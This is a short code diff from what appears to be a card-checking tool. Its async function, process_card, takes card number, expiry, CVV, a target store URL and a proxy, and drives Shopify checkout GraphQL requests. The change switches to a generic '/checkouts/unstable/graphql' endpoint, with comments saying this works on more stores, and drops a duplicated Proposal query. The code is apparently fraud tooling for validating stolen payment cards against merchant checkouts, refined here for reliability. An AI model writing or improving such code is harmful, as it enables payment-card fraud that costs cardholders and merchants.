@@ -640,11 +640,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'Proposal'
             }
 
-            # Build graphql URL based on actual checkout URL format
-            if checkout_uses_cn:
-                graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/cn/{attempt_token}/graphql'
-            else:
-                graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/{attempt_token}/graphql'
+            # Use the /unstable/ path — works across all Shopify checkout formats.
+            # Token-specific paths (/checkouts/cn/{token}/graphql) return 404 on most stores.
+            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
             
             # FIX: Send Proposal query once (was sending TWICE with 3s sleep between,
             # using only the 2nd response — wasteful and can cause stale sessions).
